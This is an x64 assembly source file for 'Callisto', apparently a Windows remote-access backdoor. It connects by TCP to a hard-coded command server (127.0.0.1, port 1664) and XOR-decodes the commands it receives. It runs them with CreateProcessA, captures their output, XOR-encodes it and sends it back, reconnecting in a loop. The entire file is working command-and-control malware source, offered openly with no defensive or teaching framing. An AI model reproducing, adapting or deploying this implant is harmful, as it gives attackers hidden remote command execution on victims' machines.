;  <callisto.asm>   -   Callisto source
;                         Copyright (c) 2020 by Joshua Finley.
;

option win64:3      ; init shadow space, reserve stack at PROC level

include ..\include\kernel32.inc
include ..\include\winsock.inc
include ..\include\ntdll.inc

;
; Definitions
;

; Constants
status_failure  equ 0xffffffff
status_success  equ 0
max_retries     equ 10
buffer_size     equ 1024
sleep_time      equ 1000
cmd_exec        equ 001b
cmd_exit        equ 010b
cmd_wait        equ 100b

; Structure(s)
shellcode_msg struct
    command         byte ?
    key             byte ?
    buffer_length   dword ?
    buffer          byte buffer_size dup(?)
shellcode_msg ends

; Function prototypes
memcpy      proto   fastcall :qword, :qword, :dword
xor_cipher  proto   fastcall :qword, :byte, :dword
system_exec proto   fastcall :qword, :qword

;
; Global data section
;
.data
    g_command_ip        db "127.0.0.1", 0
    g_command_port      dw 1664

;
; Code section
;
.code

    main proc
        local command_message:shellcode_msg
        local output_buffer[buffer_size]:byte
        local wsa_data:wsadata
        local sock_addr:sockaddr_in
        local dw_socket:dword
        local dw_socket_buffer_size:dword
        local cipher_key:byte
        local retries:dword
        local bytes_read:dword
        ; Initialize Winsock
        invoke WSAStartup, 516, addr wsa_data
        test eax, eax
        jnz _exit
        
        ; Create a socket
    _create_socket:
        invoke socket, af_inet, sock_stream, ipproto_tcp
        cmp eax, socket_error
        je _exit
        mov dw_socket, eax

        ; Setup connection information
        invoke RtlZeroMemory, addr sock_addr, sizeof sockaddr_in
        invoke inet_addr, addr g_command_ip
        mov sock_addr.sin_addr, eax
        mov sock_addr.sin_family, af_inet
        invoke htons, g_command_port
        mov sock_addr.sin_port, ax

        ; Connect to command server 
    _connect:
        invoke connect, dw_socket, addr sock_addr, sizeof sock_addr
        cmp eax, socket_error
        je _reconnect

        ; Enter command loop
        mov retries, 0
        .while retries < max_retries -1
            invoke RtlZeroMemory, addr command_message, sizeof command_message

            ; Receive instructions from the command server
            invoke recv, dw_socket, addr command_message, sizeof command_message, 0
            .if eax == socket_error || eax == 0
                mov eax, retries
                inc eax
                mov retries, eax
                jmp _wait
            .endif

            ; Check what command was sent
            lea rax, command_message
            cmp [rax].shellcode_msg.command, cmd_wait
            je _wait
            cmp [rax].shellcode_msg.command, cmd_exit
            je _exit
            cmp [rax].shellcode_msg.command, cmd_exec
            je _exec
            .continue
        _exec:
            ; Decode the command buffer 
            invoke xor_cipher, addr command_message.shellcode_msg.buffer, command_message.shellcode_msg.key, command_message.shellcode_msg.buffer_length

            ; Execute the command
            invoke system_exec, addr command_message.shellcode_msg.buffer, addr output_buffer
            .if eax == status_failure
                mov eax, retries
                inc eax
                mov retries, eax
                jmp _wait
            .endif

            ; Encrypt the response
            mov bytes_read, eax
            invoke xor_cipher, addr output_buffer, command_message.shellcode_msg.key, bytes_read

            ; Post the result back to the server
            invoke send, dw_socket, addr output_buffer, bytes_read, 0
        _wait:
            invoke Sleep, sleep_time
            .continue
        .endw

        jmp _reconnect

    _exit:
        invoke shutdown, dw_socket, sd_both
        invoke closesocket, dw_socket
        invoke WSACleanup
        ret

    _reconnect:
        invoke closesocket, dw_socket
        invoke Sleep, 1000
        jmp _create_socket
    main endp

    system_exec proc fastcall, system_exec_buffer:qword, out_buffer:qword
        local pipe_buffer[buffer_size]:byte
        local s_info:startupinfoa
        local p_info:process_information
        local sa:security_attributes
        local h_stdout_write:qword
        local h_stdout_read:qword
        local bytes_read:dword
        local status:dword

        invoke RtlZeroMemory, addr s_info, sizeof startupinfoa
        invoke RtlZeroMemory, addr p_info, sizeof process_information
        invoke RtlZeroMemory, addr sa, 0x18
        invoke RtlZeroMemory, addr pipe_buffer, buffer_size
        
        ; Setup security attributes struct
        mov sa.nLength, 0x18
        mov sa.lpSecurityDescriptor, 0
        mov sa.bInheritHandle, 1

        ; Create a pipe for the child process's STDOUT
        invoke CreatePipe, addr h_stdout_read, addr h_stdout_write, addr sa, 0
        test eax, eax
        jz _error

        ; Ensure the read handle is not inherited
        invoke SetHandleInformation, h_stdout_read, handle_flag_inherit, 0
        test eax, eax
        jz _error

        ; Setup the startup information strucet
        mov rax, h_stdout_write
        mov s_info.cbSize, sizeof startupinfoa
        mov s_info.hStdError, rax
        mov s_info.hStdOutput, rax
        invoke GetStdHandle, std_input_handle
        mov s_info.hStdInput, rax
        mov s_info.dwFlags, startf_usestdhandles
        
        ; Ensure the buffer is null-terminated
        mov rcx, system_exec_buffer
        add rcx, buffer_size -1
        mov byte ptr [rcx], 0

        ; Spawn the child process
        invoke CreateProcessA, 0, system_exec_buffer, 0, 0, 1, 0, 0, 0, addr s_info, addr p_info
        .if eax == 0
            jmp _error
        .endif

        ; Close the write end of the pipe before reading from the read end
        invoke CloseHandle, h_stdout_write
        .if eax == 0
            jmp _error
        .endif

        ; Read the process output
        ; Note: This only handles the first 1024 bytes
        invoke ReadFile, h_stdout_read, addr pipe_buffer, buffer_size - 1, addr bytes_read, 0
        .if eax == 0
            invoke GetLastError
            cmp eax, error_handle_eof
            je _done_reading
            jmp _error
        _done_reading:
            jmp _success
        .endif

        mov eax, bytes_read
        mov dword ptr [status], eax
        invoke RtlCopyMemory, out_buffer, addr pipe_buffer, bytes_read

        ; Wait for the child process to exit
        invoke WaitForSingleObject, p_info.hProcess, infinite

        _success:
            mov eax, bytes_read
            mov dword ptr [status], eax
            jmp _exit
        _error:
            mov dword ptr [status], status_failure
        _exit:
            .if p_info.hProcess != -1 && p_info.hProcess != 0
                invoke CloseHandle, p_info.hProcess
            .endif
            .if p_info.hThread != -1 && p_info.hThread != 0
                invoke CloseHandle, p_info.hThread
            .endif
            .if h_stdout_read != -1 && h_stdout_read != 0
                invoke CloseHandle, h_stdout_read
            .endif

            mov eax, dword ptr [status]
            ret
    system_exec endp

    xor_cipher proc fastcall xor_buffer_addr:qword, xor_cipher_key:byte, xor_buffer_size:dword
        xor eax, eax
    _loop:
        cmp eax, r8d
        je _done
        xor byte ptr [rcx + rax], dl
        inc eax
        jmp _loop
    _done:
        ret
    xor_cipher endp

end